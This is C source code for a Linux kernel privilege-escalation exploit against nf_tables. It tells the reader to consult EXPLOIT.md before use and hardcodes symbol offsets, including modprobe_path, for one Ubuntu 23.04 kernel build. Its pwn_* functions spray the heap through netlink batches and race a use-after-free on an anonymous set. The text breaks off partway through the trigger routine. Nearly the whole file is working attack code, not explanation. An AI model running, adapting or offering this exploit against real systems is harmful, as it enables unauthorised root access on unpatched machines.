/****************************************************************************
 *
 * Please read EXPLOIT.md carefully before using.
 *
 */


#define _GNU_SOURCE

#include <pthread.h>
#include <setjmp.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

#include <err.h>
#include <errno.h>
#include <fcntl.h>
#include <signal.h>
#include <sys/ioctl.h>
#include <sys/stat.h>
#include <unistd.h>

#include <net/if.h>
#include <netinet/in.h>
#include <linux/netfilter.h>
#include <linux/netfilter/nf_tables.h>

#include <libmnl/libmnl.h>
#include <libnftnl/chain.h>
#include <libnftnl/expr.h>
#include <libnftnl/object.h>
#include <libnftnl/rule.h>
#include <libnftnl/set.h>
#include <libnftnl/table.h>


uint64_t cfg_race_set_slab = 1;
uint64_t cfg_race_set_elem_count = 0x300 * 0x800;

useconds_t cfg_initial_usleep = 4 * 1000 * 1000;
useconds_t cfg_race_lead_usleep = 100 * 1000;
useconds_t cfg_race_lag_usleep = 600 * 1000;
useconds_t cfg_reuse_usleep = 100 * 1000;


/*
 * Specific to the Linux kernel distributed in binary form as the following
 * packages from Ubuntu 23.04 (Lunar Lobster):
 *   * "linux-image-6.2.0-20-generic", version "6.2.0-20.20", and
 *   * "linux-modules-6.2.0-20-generic", version "6.2.0-20.20".
 */

uint64_t cfg_free_percpu = 0xffffffffa419d240 - 0xffffffffa3e00000;
uint64_t cfg_modprobe_path = 0xffffffffa688b900 - 0xffffffffa3e00000;
uint64_t cfg_nft_counter_destroy = 0xffffffffc06a3700 - 0xffffffffc0680000;
uint64_t cfg_nft_counter_ops = 0xffffffffc06b47a0 - 0xffffffffc0680000;

/*
0000000000023700 <nft_counter_destroy>:
   23700:       e8 00 00 00 00          call   <__fentry__>
   23705:       55                      push   rbp
   23706:       48 8b 7e 08             mov    rdi,QWORD PTR [rsi+0x8]
   2370a:       48 89 e5                mov    rbp,rsp
   2370d:       e8 00 00 00 00          call   <free_percpu>
   23712:       5d                      pop    rbp
   23713:       31 f6                   xor    esi,esi
   23715:       31 ff                   xor    edi,edi
   23717:       e9 00 00 00 00          jmp    <__x86_return_thunk>
 */
uint64_t cfg_nft_counter_destroy_call_offset = (0x23712 - 0x23700) - 8;
uint64_t cfg_nft_counter_destroy_call_mask = 0xffffffff;
uint64_t cfg_nft_counter_destroy_call_check = 0xe8e58948;


#define uaf_chunk_size 0x80
#define mnl_batch_limit (1024 * 1024)


char mnl_batch_buffer[2 * mnl_batch_limit];


char uaf_set_key[8 + 0x34];
char log_prefix[0x100];

int cfg_load_line(char *line)
{
    char *saveptr = NULL;
    char *value = strtok_r(line, "\t ", &saveptr);
    if (value == NULL) {
        return EFAULT;
    }

    char *key = NULL;
    do {
        key = strtok_r(NULL, "\t\n ", &saveptr);
        if (key == NULL) {
            return EFAULT;
        }
    } while (strlen(key) < 2);

    errno = 0;

    if (strcmp(key, "race_set_slab") == 0) {
        cfg_race_set_slab = strtoul(value, NULL, 0);
    }
    else if (strcmp(key, "race_set_elem_count") == 0) {
        cfg_race_set_elem_count = 1000L * strtoul(value, NULL, 0);
    }
    else if (strcmp(key, "initial_sleep") == 0) {
        cfg_initial_usleep = 1000L * strtoul(value, NULL, 0);
    }
    else if (strcmp(key, "race_lead_sleep") == 0) {
        cfg_race_lead_usleep = 1000L * strtoul(value, NULL, 0);
    }
    else if (strcmp(key, "race_lag_sleep") == 0) {
        cfg_race_lag_usleep = 1000L * strtoul(value, NULL, 0);
    }
    else if (strcmp(key, "reuse_sleep") == 0) {
        cfg_reuse_usleep = 1000L * strtoul(value, NULL, 0);
    }
    else if (strcmp(key, "free_percpu") == 0) {
        cfg_free_percpu = strtoul(value, NULL, 16);
    }
    else if (strcmp(key, "modprobe_path") == 0) {
        cfg_modprobe_path = strtoul(value, NULL, 16);
    }
    else if (strcmp(key, "nft_counter_destroy") == 0) {
        cfg_nft_counter_destroy = strtoul(value, NULL, 16);
    }
    else if (strcmp(key, "nft_counter_ops") == 0) {
        cfg_nft_counter_ops = strtoul(value, NULL, 16);
    }
    else if (strcmp(key, "nft_counter_destroy_call_offset") == 0) {
        cfg_nft_counter_destroy_call_offset = strtoul(value, NULL, 16);
    }
    else if (strcmp(key, "nft_counter_destroy_call_mask") == 0) {
        cfg_nft_counter_destroy_call_mask = strtoul(value, NULL, 16);
    }
    else if (strcmp(key, "nft_counter_destroy_call_check") == 0) {
        cfg_nft_counter_destroy_call_check = strtoul(value, NULL, 16);
    }
    else {
        errno = ENOENT;
    }

    return errno;
}


static void cfg_load(char *path)
{
    FILE *stream = fopen(path, "r");
    if (stream != NULL) {
        char *line = NULL;
        size_t len = 0;
        ssize_t nread;

        while ((nread = getline(&line, &len, stream)) != -1) {
            if (cfg_load_line(line) != 0) {
            }
        }
        fclose(stream);
    }
}

static void append_del_set(struct mnl_nlmsg_batch *batch, uint32_t seq,
    uint32_t family, char *table_name, char *set_name)
{
    struct nftnl_set *set = nftnl_set_alloc();
    if (set == NULL) {
        errx(1, "Cannot into nftnl_set_alloc()");
    }

    nftnl_set_set_u32(set, NFTNL_SET_FAMILY, family);
    nftnl_set_set_str(set, NFTNL_SET_TABLE, table_name);
    nftnl_set_set_str(set, NFTNL_SET_NAME, set_name);

    struct nlmsghdr *nlh = nftnl_set_nlmsg_build_hdr(
        mnl_nlmsg_batch_current(batch),
        NFT_MSG_DELSET,
        NFPROTO_INET,
        NLM_F_ACK,
        seq
    );
    nftnl_set_nlmsg_build_payload(nlh, set);
    mnl_nlmsg_batch_next(batch);

    nftnl_set_free(set);
}


static void append_new_obj(struct mnl_nlmsg_batch *batch, uint32_t seq,
    uint32_t family, char *table_name, char *obj_name,
    char *obj_userdata, uint32_t obj_userdata_len)
{
    struct nftnl_obj *obj = nftnl_obj_alloc();
    if (obj == NULL) {
        errx(1, "Cannot into nftnl_obj_alloc()");
    }

    nftnl_obj_set_u32(obj, NFTNL_OBJ_FAMILY, family);
    nftnl_obj_set_u32(obj, NFTNL_OBJ_TYPE, NFT_OBJECT_COUNTER);
    nftnl_obj_set_str(obj, NFTNL_OBJ_TABLE, table_name);
    nftnl_obj_set_str(obj, NFTNL_OBJ_NAME, obj_name);
    if (obj_userdata) {
        nftnl_obj_set_data(obj, NFTNL_OBJ_USERDATA, obj_userdata, obj_userdata_len);
    }

    struct nlmsghdr *nlh = nftnl_nlmsg_build_hdr(
        mnl_nlmsg_batch_current(batch),
        NFT_MSG_NEWOBJ,
        family,
        NLM_F_ACK,
        seq++
    );
    nftnl_obj_nlmsg_build_payload(nlh, obj);
    nftnl_obj_free(obj);
    mnl_nlmsg_batch_next(batch);
}


static void append_del_obj(struct mnl_nlmsg_batch *batch, uint32_t seq,
    uint32_t family, char *table_name, char *obj_name)
{
    struct nftnl_obj *obj = nftnl_obj_alloc();
    if (obj == NULL) {
        errx(1, "Cannot into nftnl_obj_alloc()");
    }

    nftnl_obj_set_u32(obj, NFTNL_OBJ_FAMILY, family);
    nftnl_obj_set_u32(obj, NFTNL_OBJ_TYPE, NFT_OBJECT_COUNTER);
    nftnl_obj_set_str(obj, NFTNL_OBJ_TABLE, table_name);
    nftnl_obj_set_str(obj, NFTNL_OBJ_NAME, obj_name);

    struct nlmsghdr *nlh = nftnl_nlmsg_build_hdr(
        mnl_nlmsg_batch_current(batch),
        NFT_MSG_DELOBJ,
        family,
        NLM_F_ACK,
        seq++
    );
    nftnl_obj_nlmsg_build_payload(nlh, obj);
    nftnl_obj_free(obj);
    mnl_nlmsg_batch_next(batch);
}


static void append_del_rule(struct mnl_nlmsg_batch *batch, uint32_t seq,
    uint32_t family, char *table_name, char *chain_name, uint64_t rule_handle)
{
    struct nftnl_rule *rule = nftnl_rule_alloc();
    if (rule == NULL) {
        errx(1, "Cannot into nftnl_rule_alloc()");
    }

    nftnl_rule_set_str(rule, NFTNL_RULE_TABLE, table_name);
    nftnl_rule_set_str(rule, NFTNL_RULE_CHAIN, chain_name);
    nftnl_rule_set_u32(rule, NFTNL_RULE_FAMILY, family);
    if (rule_handle != -1) {
        nftnl_rule_set_u64(rule, NFTNL_RULE_HANDLE, rule_handle);
    }

    struct nlmsghdr *nlh = nftnl_rule_nlmsg_build_hdr(
        mnl_nlmsg_batch_current(batch),
        NFT_MSG_DELRULE,
        family,
        NLM_F_ACK,
        seq
    );
    nftnl_rule_nlmsg_build_payload(nlh, rule);
    mnl_nlmsg_batch_next(batch);

    nftnl_rule_free(rule);
}


uint32_t pwn_family = NFPROTO_INET;
char *pwn_table = "testfirewall";

char *pwn_lookup_set = "set_A";
char *pwn_lookup_chain = "OUTPUT";

char *pwn_log_chain = "INPUT";

char *pwn_dynset_set = "set_dyn";
char *pwn_dynset_chain = "chain_dyn";


static void pwn_create_table(struct mnl_nlmsg_batch *batch, uint32_t seq)
{
    struct nftnl_table *table = nftnl_table_alloc();
    if (table == NULL) {
        errx(1, "Cannot into nftnl_table_alloc()");
    }

    nftnl_table_set_u32(table, NFTNL_TABLE_FAMILY, pwn_family);
    nftnl_table_set_str(table, NFTNL_TABLE_NAME, pwn_table);

    struct nlmsghdr *nlh = nftnl_table_nlmsg_build_hdr(
        mnl_nlmsg_batch_current(batch),
        NFT_MSG_NEWTABLE,
        pwn_family,
        NLM_F_CREATE | NLM_F_ACK,
        seq
    );
    nftnl_table_nlmsg_build_payload(nlh, table);
    mnl_nlmsg_batch_next(batch);

    nftnl_table_free(table);
}


static void pwn_create_set(struct mnl_nlmsg_batch *batch, uint32_t seq,
    char *set_name, uint32_t set_id, uint32_t set_flags,
    uint32_t set_key_len, uint32_t set_desc_size,
    void *set_userdata, uint32_t set_userdata_len)
{
    struct nftnl_set *set = nftnl_set_alloc();
    if (set == NULL) {
        errx(1, "Cannot into nftnl_set_alloc()");
    }

    nftnl_set_set_u32(set, NFTNL_SET_FAMILY, pwn_family);
    nftnl_set_set_str(set, NFTNL_SET_TABLE, pwn_table);
    nftnl_set_set_str(set, NFTNL_SET_NAME, set_name);
    nftnl_set_set_u32(set, NFTNL_SET_ID, set_id);
    nftnl_set_set_u32(set, NFTNL_SET_FLAGS, set_flags);
    nftnl_set_set_u32(set, NFTNL_SET_KEY_LEN, set_key_len);
    if (set_desc_size != 0) {
        nftnl_set_set_u32(set, NFTNL_SET_DESC_SIZE, set_desc_size);
    }
    if (set_userdata != NULL) {
        nftnl_set_set_data(set, NFTNL_SET_USERDATA, set_userdata, set_userdata_len);
    }

    struct nlmsghdr *nlh = nftnl_set_nlmsg_build_hdr(
        mnl_nlmsg_batch_current(batch),
        NFT_MSG_NEWSET,
        pwn_family,
        NLM_F_CREATE | NLM_F_ACK,
        seq
    );
    nftnl_set_nlmsg_build_payload(nlh, set);
    mnl_nlmsg_batch_next(batch);

    nftnl_set_free(set);
}


static void pwn_create_chain(struct mnl_nlmsg_batch *batch, uint32_t seq,
    char *chain_name)
{
    struct nftnl_chain *chain = nftnl_chain_alloc();
    if (chain == NULL) {
        errx(1, "Cannot into nftnl_chain_alloc()");
    }

    nftnl_chain_set_u32(chain, NFTNL_CHAIN_FAMILY, pwn_family);
    nftnl_chain_set_str(chain, NFTNL_CHAIN_TABLE, pwn_table);
    nftnl_chain_set_str(chain, NFTNL_CHAIN_NAME, chain_name);

    struct nlmsghdr *nlh = nftnl_chain_nlmsg_build_hdr(
        mnl_nlmsg_batch_current(batch),
        NFT_MSG_NEWCHAIN,
        pwn_family,
        NLM_F_CREATE | NLM_F_ACK,
        seq
    );
    nftnl_chain_nlmsg_build_payload(nlh, chain);
    mnl_nlmsg_batch_next(batch);

    nftnl_chain_free(chain);
}


static void pwn_create_lookup_set_elem(struct mnl_nlmsg_batch *batch, uint32_t seq,
    char *set_name,
    void *set_elem_key, uint32_t set_elem_key_len)
{
    char set_elem_userdata[0x2f] = {};

    struct nftnl_set *set = nftnl_set_alloc();
    if (set == NULL) {
        errx(1, "Cannot into nftnl_set_alloc()");
    }

    nftnl_set_set_u32(set, NFTNL_SET_FAMILY, pwn_family);
    nftnl_set_set_str(set, NFTNL_SET_TABLE, pwn_table);
    nftnl_set_set_str(set, NFTNL_SET_NAME, set_name);

    struct nftnl_set_elem *set_elem = nftnl_set_elem_alloc();
    if (set_elem == NULL) {
        errx(1, "Cannot into nftnl_set_elem_alloc()");
    }

    nftnl_set_elem_set(set_elem, NFTNL_SET_ELEM_KEY, set_elem_key, set_elem_key_len);
    nftnl_set_elem_set(set_elem, NFTNL_SET_ELEM_USERDATA, set_elem_userdata, sizeof(set_elem_userdata));

    nftnl_set_elem_add(set, set_elem);

    struct nlmsghdr *nlh = nftnl_nlmsg_build_hdr(
        mnl_nlmsg_batch_current(batch),
        NFT_MSG_NEWSETELEM,
        NFPROTO_INET,
        NLM_F_CREATE | NLM_F_EXCL | NLM_F_ACK,
        seq
    );
    nftnl_set_elems_nlmsg_build_payload(nlh, set);
    mnl_nlmsg_batch_next(batch);

    nftnl_set_free(set);
}


static void pwn_create_lookup_rule(struct mnl_nlmsg_batch *batch, uint32_t seq,
    char *chain_name, char *set_name)
{
    struct nftnl_rule *rule = nftnl_rule_alloc();
    if (rule == NULL) {
        errx(1, "Cannot into nftnl_rule_alloc()");
    }

    nftnl_rule_set_u32(rule, NFTNL_RULE_FAMILY, pwn_family);
    nftnl_rule_set_str(rule, NFTNL_RULE_TABLE, pwn_table);
    nftnl_rule_set_str(rule, NFTNL_RULE_CHAIN, chain_name);

    struct nftnl_expr *lookup = nftnl_expr_alloc("lookup");
    if (lookup == NULL) {
        errx(1, "Cannot into nftnl_expr_alloc()");
    }

    nftnl_expr_set_u32(lookup, NFTNL_EXPR_LOOKUP_SREG, NFT_REG_1);
    nftnl_expr_set_str(lookup, NFTNL_EXPR_LOOKUP_SET, set_name);
    nftnl_expr_set_u32(lookup, NFTNL_EXPR_LOOKUP_FLAGS, 0);

    nftnl_rule_add_expr(rule, lookup);

    struct nlmsghdr *nlh = nftnl_rule_nlmsg_build_hdr(
        mnl_nlmsg_batch_current(batch),
        NFT_MSG_NEWRULE,
        pwn_family,
        NLM_F_APPEND | NLM_F_CREATE | NLM_F_ACK,
        seq
    );
    nftnl_rule_nlmsg_build_payload(nlh, rule);
    mnl_nlmsg_batch_next(batch);

    nftnl_rule_free(rule);
}


static void pwn_create_log_rule(struct mnl_nlmsg_batch *batch, uint32_t seq,
    char *chain_name, char *log_prefix)
{
    char rule_userdata[0x2f] = {};

    struct nftnl_rule *rule = nftnl_rule_alloc();
    if (rule == NULL) {
        errx(1, "Cannot into nftnl_rule_alloc()");
    }

    nftnl_rule_set_u32(rule, NFTNL_RULE_FAMILY, pwn_family);
    nftnl_rule_set_str(rule, NFTNL_RULE_TABLE, pwn_table);
    nftnl_rule_set_str(rule, NFTNL_RULE_CHAIN, chain_name);
    nftnl_rule_set_data(rule, NFTNL_RULE_USERDATA, rule_userdata, sizeof(rule_userdata));

    struct nftnl_expr *byteorder = nftnl_expr_alloc("byteorder");
    if (byteorder == NULL) {
        errx(1, "Cannot into nftnl_expr_alloc()");
    }

    nftnl_expr_set_u32(byteorder, NFTNL_EXPR_BYTEORDER_OP, NFT_BYTEORDER_NTOH);
    nftnl_expr_set_u32(byteorder, NFTNL_EXPR_BYTEORDER_SIZE, 8);
    nftnl_expr_set_u32(byteorder, NFTNL_EXPR_BYTEORDER_SREG, NFT_REG_1);
    nftnl_expr_set_u32(byteorder, NFTNL_EXPR_BYTEORDER_DREG, NFT_REG_2);
    nftnl_expr_set_u32(byteorder, NFTNL_EXPR_BYTEORDER_LEN, 1);

    nftnl_rule_add_expr(rule, byteorder);

    struct nftnl_expr *log = nftnl_expr_alloc("log");
    if (log == NULL) {
        errx(1, "Cannot into nftnl_expr_alloc()");
    }

    nftnl_expr_set_u32(log, NFTNL_EXPR_LOG_LEVEL, NFT_LOGLEVEL_AUDIT);
    nftnl_expr_set_str(log, NFTNL_EXPR_LOG_PREFIX, log_prefix);

    nftnl_rule_add_expr(rule, log);

    struct nlmsghdr *nlh = nftnl_rule_nlmsg_build_hdr(
        mnl_nlmsg_batch_current(batch),
        NFT_MSG_NEWRULE,
        pwn_family,
        NLM_F_APPEND | NLM_F_CREATE | NLM_F_ACK,
        seq
    );
    nftnl_rule_nlmsg_build_payload(nlh, rule);
    mnl_nlmsg_batch_next(batch);

    nftnl_rule_free(rule);
}


static void pwn_create_dynset_set(struct mnl_nlmsg_batch *batch, uint32_t seq,
    char *set_name, uint32_t set_id)
{
    struct nftnl_set *set = nftnl_set_alloc();
    if (set == NULL) {
        errx(1, "Cannot into nftnl_set_alloc()");
    }

    nftnl_set_set_u32(set, NFTNL_SET_FAMILY, pwn_family);
    nftnl_set_set_str(set, NFTNL_SET_TABLE, pwn_table);
    nftnl_set_set_str(set, NFTNL_SET_NAME, set_name);
    nftnl_set_set_u32(set, NFTNL_SET_ID, set_id);
    nftnl_set_set_u32(set, NFTNL_SET_FLAGS, NFT_SET_EVAL | NFT_SET_EXPR);
    nftnl_set_set_u32(set, NFTNL_SET_KEY_LEN, 0x34);

    struct nftnl_expr *counter = nftnl_expr_alloc("counter");
    if (counter == NULL) {
        errx(1, "Cannot into nftnl_expr_alloc()");
    }

    nftnl_set_add_expr(set, counter);

    struct nftnl_expr *quota = nftnl_expr_alloc("quota");
    if (quota == NULL) {
        errx(1, "Cannot into nftnl_expr_alloc()");
    }

    nftnl_expr_set_u64(quota, NFTNL_EXPR_QUOTA_BYTES, 0x7fffffffffffffff);

    nftnl_set_add_expr(set, quota);

    struct nlmsghdr *nlh = nftnl_set_nlmsg_build_hdr(
        mnl_nlmsg_batch_current(batch),
        NFT_MSG_NEWSET,
        pwn_family,
        NLM_F_CREATE | NLM_F_ACK,
        seq
    );
    nftnl_set_nlmsg_build_payload(nlh, set);
    mnl_nlmsg_batch_next(batch);

    nftnl_set_free(set);
}


static void pwn_create_dynset_chain(struct mnl_nlmsg_batch *batch, uint32_t seq,
    char *chain_name)
{
    struct nftnl_chain *chain = nftnl_chain_alloc();
    if (chain == NULL) {
        errx(1, "Cannot into nftnl_chain_alloc()");
    }

    nftnl_chain_set_u32(chain, NFTNL_CHAIN_FAMILY, pwn_family);
    nftnl_chain_set_str(chain, NFTNL_CHAIN_TABLE, pwn_table);
    nftnl_chain_set_str(chain, NFTNL_CHAIN_NAME, chain_name);
    nftnl_chain_set_str(chain, NFTNL_CHAIN_TYPE, "filter");
    nftnl_chain_set_u32(chain, NFTNL_CHAIN_HOOKNUM, NF_INET_LOCAL_OUT);
    nftnl_chain_set_u32(chain, NFTNL_CHAIN_PRIO, 0);

    struct nlmsghdr *nlh = nftnl_chain_nlmsg_build_hdr(
        mnl_nlmsg_batch_current(batch),
        NFT_MSG_NEWCHAIN,
        pwn_family,
        NLM_F_CREATE | NLM_F_ACK,
        seq
    );
    nftnl_chain_nlmsg_build_payload(nlh, chain);
    mnl_nlmsg_batch_next(batch);

    nftnl_chain_free(chain);
}


static void pwn_create_dynset_rule(struct mnl_nlmsg_batch *batch, uint32_t seq,
    char *chain_name, char *dynset_set_name)
{
    struct nftnl_rule *rule = nftnl_rule_alloc();
    if (rule == NULL) {
        errx(1, "Cannot into nftnl_rule_alloc()");
    }

    nftnl_rule_set_u32(rule, NFTNL_RULE_FAMILY, pwn_family);
    nftnl_rule_set_str(rule, NFTNL_RULE_TABLE, pwn_table);
    nftnl_rule_set_str(rule, NFTNL_RULE_CHAIN, chain_name);

    struct nftnl_expr *payload = nftnl_expr_alloc("payload");
    if (payload == NULL) {
        errx(1, "Cannot into nftnl_expr_alloc()");
    }

    nftnl_expr_set_u32(payload, NFTNL_EXPR_PAYLOAD_BASE, NFT_PAYLOAD_INNER_HEADER);
    nftnl_expr_set_u32(payload, NFTNL_EXPR_PAYLOAD_OFFSET, 0);
    nftnl_expr_set_u32(payload, NFTNL_EXPR_PAYLOAD_LEN, 1);
    nftnl_expr_set_u32(payload, NFTNL_EXPR_PAYLOAD_DREG, NFT_REG_1);

    nftnl_rule_add_expr(rule, payload);

    struct nftnl_expr *dynset = nftnl_expr_alloc("dynset");
    if (dynset == NULL) {
        errx(1, "Cannot into nftnl_expr_alloc()");
    }

    nftnl_expr_set_str(dynset, NFTNL_EXPR_DYNSET_SET_NAME, dynset_set_name);
    nftnl_expr_set_u32(dynset, NFTNL_EXPR_DYNSET_OP, htonl(NFT_DYNSET_OP_UPDATE));
    nftnl_expr_set_u32(dynset, NFTNL_EXPR_DYNSET_FLAGS, NFT_DYNSET_F_EXPR);
    nftnl_expr_set_u32(dynset, NFTNL_EXPR_DYNSET_SREG_KEY, NFT_REG_1);

    struct nftnl_expr *counter = nftnl_expr_alloc("counter");
    if (counter == NULL) {
        errx(1, "Cannot into nftnl_expr_alloc()");
    }

    nftnl_expr_add_expr(dynset, NFTNL_EXPR_DYNSET_EXPR, counter);

    struct nftnl_expr *quota = nftnl_expr_alloc("quota");
    if (quota == NULL) {
        errx(1, "Cannot into nftnl_expr_alloc()");
    }

    nftnl_expr_set_u64(quota, NFTNL_EXPR_QUOTA_BYTES, 0x7fffffffffffffff);

    nftnl_expr_add_expr(dynset, NFTNL_EXPR_DYNSET_EXPR, quota);

    nftnl_rule_add_expr(rule, dynset);

    struct nlmsghdr *nlh = nftnl_rule_nlmsg_build_hdr(
        mnl_nlmsg_batch_current(batch),
        NFT_MSG_NEWRULE,
        pwn_family,
        NLM_F_APPEND | NLM_F_CREATE | NLM_F_ACK,
        seq
    );
    nftnl_rule_nlmsg_build_payload(nlh, rule);
    mnl_nlmsg_batch_next(batch);

    nftnl_rule_free(rule);
}


static void pwn_prepare(struct mnl_socket *nl)
{
    uint32_t portid, seq, table_seq;
    int ret;

    seq = time(NULL);

    struct mnl_nlmsg_batch *batch = mnl_nlmsg_batch_start(mnl_batch_buffer, mnl_batch_limit);

    nftnl_batch_begin(mnl_nlmsg_batch_current(batch), seq++);
    table_seq = seq;
    mnl_nlmsg_batch_next(batch);

    pwn_create_table(batch, seq++);

    pwn_create_chain(batch, seq++, pwn_lookup_chain);

    pwn_create_chain(batch, seq++, pwn_log_chain);
    /* load "nft_log.ko" now to reduce noise when racing */
    pwn_create_log_rule(batch, seq++, pwn_log_chain, log_prefix);

    pwn_create_dynset_set(batch, seq++, pwn_dynset_set, 0);
    pwn_create_dynset_chain(batch, seq++, pwn_dynset_chain);
    pwn_create_dynset_rule(batch, seq++, pwn_dynset_chain, pwn_dynset_set);

    nftnl_batch_end(mnl_nlmsg_batch_current(batch), seq++);
    mnl_nlmsg_batch_next(batch);

    portid = mnl_socket_get_portid(nl);

    if (mnl_socket_sendto(nl, mnl_nlmsg_batch_head(batch),
                          mnl_nlmsg_batch_size(batch)) < 0) {
        err(1, "Cannot into mnl_socket_sendto()");
    }

    mnl_nlmsg_batch_stop(batch);

    while (table_seq + 1 != seq) {
        ret = mnl_socket_recvfrom(nl, mnl_batch_buffer, mnl_batch_limit);
        if (ret <= 0)
            break;
        ret = mnl_cb_run(mnl_batch_buffer, ret, table_seq, portid, NULL, NULL);
        if (ret < 0)
            break;
        table_seq++;
    }
    if (ret == -1) {
        err(1, "Cannot into mnl_socket_recvfrom()");
    }
}


static void pwn_uaf_spray(struct mnl_socket *nl)
{
    uint32_t portid, seq, table_seq;
    int ret;

    memset(uaf_set_key, 0, sizeof(uaf_set_key));
    uaf_set_key[4] = 0x90;

    char set_userdata_buf[0x100] = {};

    char *set_userdata;
    uint32_t set_userdata_size;
    if (cfg_race_set_slab == 0) {
        set_userdata = NULL;
        set_userdata_size = 0;
    }
    else {
        set_userdata = set_userdata_buf;
        set_userdata_size = sizeof(set_userdata_buf);
    }

    seq = time(NULL);

    struct mnl_nlmsg_batch *batch = mnl_nlmsg_batch_start(mnl_batch_buffer, mnl_batch_limit);

    nftnl_batch_begin(mnl_nlmsg_batch_current(batch), seq++);
    table_seq = seq;
    mnl_nlmsg_batch_next(batch);

    int spray = 0;
    pwn_create_set(batch, seq++, pwn_lookup_set, spray, NFT_SET_ANONYMOUS, sizeof(uaf_set_key), 0, set_userdata, set_userdata_size);
    pwn_create_lookup_set_elem(batch, seq++, pwn_lookup_set, uaf_set_key, sizeof(uaf_set_key));
    pwn_create_lookup_rule(batch, seq++, pwn_lookup_chain, pwn_lookup_set);

    nftnl_batch_end(mnl_nlmsg_batch_current(batch), seq++);
    mnl_nlmsg_batch_next(batch);

    portid = mnl_socket_get_portid(nl);

    if (mnl_socket_sendto(nl, mnl_nlmsg_batch_head(batch),
                          mnl_nlmsg_batch_size(batch)) < 0) {
        err(1, "Cannot into mnl_socket_sendto()");
    }

    mnl_nlmsg_batch_stop(batch);

    while (table_seq + 1 != seq) {
        ret = mnl_socket_recvfrom(nl, mnl_batch_buffer, mnl_batch_limit);
        if (ret <= 0)
            break;
        ret = mnl_cb_run(mnl_batch_buffer, ret, table_seq, portid, NULL, NULL);
        if (ret < 0)
            break;
        table_seq++;
    }
    if (ret == -1) {
        err(1, "Cannot into mnl_socket_recvfrom()");
    }

}


static void pwn_delay_spray_set(struct mnl_socket *nl)
{
    uint32_t portid, seq, table_seq;
    int ret;

    seq = time(NULL);
    struct mnl_nlmsg_batch *batch = mnl_nlmsg_batch_start(mnl_batch_buffer, mnl_batch_limit);

    nftnl_batch_begin(mnl_nlmsg_batch_current(batch), seq++);
    table_seq = seq;
    mnl_nlmsg_batch_next(batch);

    pwn_create_set(batch, seq++, "set_delay", 1, 0, sizeof(uint64_t), 0, NULL, 0);

    nftnl_batch_end(mnl_nlmsg_batch_current(batch), seq++);
    mnl_nlmsg_batch_next(batch);

    portid = mnl_socket_get_portid(nl);

    if (mnl_socket_sendto(nl, mnl_nlmsg_batch_head(batch),
                          mnl_nlmsg_batch_size(batch)) < 0) {
        err(1, "Cannot into mnl_socket_sendto()");
    }

    mnl_nlmsg_batch_stop(batch);

    while (table_seq + 1 != seq) {
        ret = mnl_socket_recvfrom(nl, mnl_batch_buffer, mnl_batch_limit);
        if (ret <= 0)
            break;
        ret = mnl_cb_run(mnl_batch_buffer, ret, table_seq, portid, NULL, NULL);
        if (ret < 0)
            break;
        table_seq++;
    }
    if (ret == -1) {
        err(1, "Cannot into mnl_socket_recvfrom()");
    }
}


static void pwn_delay_spray_set_elem(struct mnl_socket *nl, uint64_t *set_elem_key, uint64_t set_elem_key_end)
{
    uint32_t portid, seq, table_seq;
    int ret;

    seq = time(NULL);
    struct mnl_nlmsg_batch *batch = mnl_nlmsg_batch_start(mnl_batch_buffer, mnl_batch_limit);

    nftnl_batch_begin(mnl_nlmsg_batch_current(batch), seq++);
    table_seq = seq;
    mnl_nlmsg_batch_next(batch);

    struct nftnl_set *set = nftnl_set_alloc();
    if (set == NULL) {
        errx(1, "Cannot into nftnl_set_alloc()");
    }

    nftnl_set_set_u32(set, NFTNL_SET_FAMILY, pwn_family);
    nftnl_set_set_str(set, NFTNL_SET_TABLE, pwn_table);
    nftnl_set_set_str(set, NFTNL_SET_NAME, "set_delay");

    uint64_t count = set_elem_key_end - (*set_elem_key);
    if (count > 0x800) {
        count = 0x800;
    }
    while (count > 0) {
        -- count;

        struct nftnl_set_elem *set_elem = nftnl_set_elem_alloc();
        if (set_elem == NULL) {
            errx(1, "Cannot into nftnl_set_elem_alloc()");
        }

        nftnl_set_elem_set(set_elem, NFTNL_SET_ELEM_KEY, set_elem_key, sizeof(*set_elem_key));

        nftnl_set_elem_add(set, set_elem);

        ++ (*set_elem_key);
    }

    struct nlmsghdr *nlh = nftnl_nlmsg_build_hdr(
        mnl_nlmsg_batch_current(batch),
        NFT_MSG_NEWSETELEM,
        NFPROTO_INET,
        NLM_F_CREATE | NLM_F_EXCL | NLM_F_ACK,
        seq++
    );
    nftnl_set_elems_nlmsg_build_payload(nlh, set);
    mnl_nlmsg_batch_next(batch);

    nftnl_set_free(set);

    nftnl_batch_end(mnl_nlmsg_batch_current(batch), seq++);
    mnl_nlmsg_batch_next(batch);

    portid = mnl_socket_get_portid(nl);

    if (mnl_socket_sendto(nl, mnl_nlmsg_batch_head(batch),
                          mnl_nlmsg_batch_size(batch)) < 0) {
        err(1, "Cannot into mnl_socket_sendto()");
    }

    mnl_nlmsg_batch_stop(batch);

    while (table_seq + 1 != seq) {
        ret = mnl_socket_recvfrom(nl, mnl_batch_buffer, mnl_batch_limit);
        if (ret <= 0)
            break;
        ret = mnl_cb_run(mnl_batch_buffer, ret, table_seq, portid, NULL, NULL);
        if (ret < 0)
            break;
        table_seq++;
    }
    if (ret == -1) {
        err(1, "Cannot into mnl_socket_recvfrom()");
    }
}


static void pwn_uaf_trigger(struct mnl_socket *nl)
{
    struct mnl_nlmsg_batch *batch;
    uint32_t portid, seq, table_seq;
    int ret;

    seq = time(NULL);
    batch = mnl_nlmsg_batch_start(mnl_batch_buffer, mnl_batch_limit);

    nftnl_batch_begin(mnl_nlmsg_batch_current(batch), seq++);
    table_seq = seq;
    mnl_nlmsg_batch_next(batch);

    append_del_rule(batch, seq++, NFPROTO_INET, "testfirewall", pwn_lookup_chain, -1);
    append_del_set(batch, seq++, NFPROTO_INET, "testfirewall", "set_delay");

    struct nftnl_set *set = nftnl_set_alloc();
    if (set == NULL) {
        errx(1, "Cannot into nftnl_set_alloc()");
    }

    nftnl_set_set_u32(set, NFTNL_SET_FAMILY, pwn_family);
    nftnl_set_set_str(set, NFTNL_SET_TABLE, pwn_table);
    nftnl_set_set_str(set, NFTNL_SET_NAME, pwn_lookup_set);

    struct nftnl_set_elem *set_elem = nftnl_set_elem_alloc();
    if (set_elem == NULL) {
        errx(1, "Cannot into nftnl_set_elem_alloc()");
    }

    nftnl_set_elem_set(set_elem, NFTNL_SET_ELEM_KEY, uaf_set_key, sizeof(uaf_set_key));

    nftnl_set_elem_add(set, set_elem);

    struct nlmsghdr *nlh = nftnl_nlmsg_build_hdr(
        mnl_nlmsg_batch_current(batch),
